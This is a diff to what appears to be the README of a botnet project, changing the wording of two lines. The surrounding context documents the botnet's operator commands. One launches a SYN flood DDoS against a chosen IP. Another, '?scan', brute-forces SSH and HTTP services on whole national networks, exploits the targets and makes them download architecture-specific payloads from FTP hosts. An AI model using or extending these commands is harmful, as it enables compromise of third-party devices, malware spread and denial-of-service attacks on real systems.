@@ -100,7 +100,7 @@ The vulnerability exploit that's used in this botnet will mostly be command inje
 # Attack Feature
 The attack feature will mostly focus on the transport layer attack, but it will also include application and network layer attacks. All of the attack vectors, except for the "HTTP" DDoS attack vectors, will use random source ports and windows size automatically. However, the destination port will be configurable by the bot herder themselves.
 
-	# tcp -syn 127.0.0.1 192.168.50.129 -r 100 //a command that's used in this screenshot.
+	# tcp -syn 127.0.0.1 192.168.50.129 -r 100
 
 <img src="assets/synflood.png" alt="synflood, DoS example">
 
@@ -136,7 +136,7 @@ The attack feature will mostly focus on the transport layer attack, but it will 
 		
 	# Example: ?scan -r ftp://1.2.3.4/bin/payload_x32 ftp://5.6.7.8/bin/payload_mips_x32 ftp://4.3.2.1/bin/payload_arm_x32
 		
-	?scan <network> <default> <mips> <arm>		Scan default SSH and HTTP port on the network, brute-force attack, and exploit the target.
+	?scan <network> <default> <mips> <arm>		Scan default SSH and HTTP port on the network. Brute-force attack, and exploit the target.
 
 		-cn		Scan on China network.
 		-usa		Scan on U.S.A network.
